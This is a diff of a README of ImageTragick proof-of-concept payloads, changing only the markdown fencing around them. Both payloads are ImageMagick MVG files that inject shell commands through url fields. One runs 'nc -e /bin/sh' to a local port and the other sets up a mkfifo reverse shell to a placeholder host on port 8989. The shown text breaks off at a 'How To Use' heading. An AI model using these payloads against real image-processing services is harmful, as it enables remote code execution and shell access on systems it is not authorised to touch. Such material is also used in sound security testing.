@@ -1,21 +1,20 @@
 # ImageTragick POCs
 
 ## RCE_POC
-----
+```
 
 push graphic-context
 viewbox 0 0 640 480
 fill 'url(https://127.0.0.1/someimage.jpg"|nc -e /bin/sh 127.0.0.1 "4544)'
 pop grahic-context
 
-----
-----
+```
+```
 push graphic-context
 viewbox 0 0 640 480
 image over 0,0 0,0 'https://127.0.0.1/x.php?x=` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x 8989 >/tmp/f `'
 pop graphic-context
-
-----
+```
 
 ## How To Use
 ```
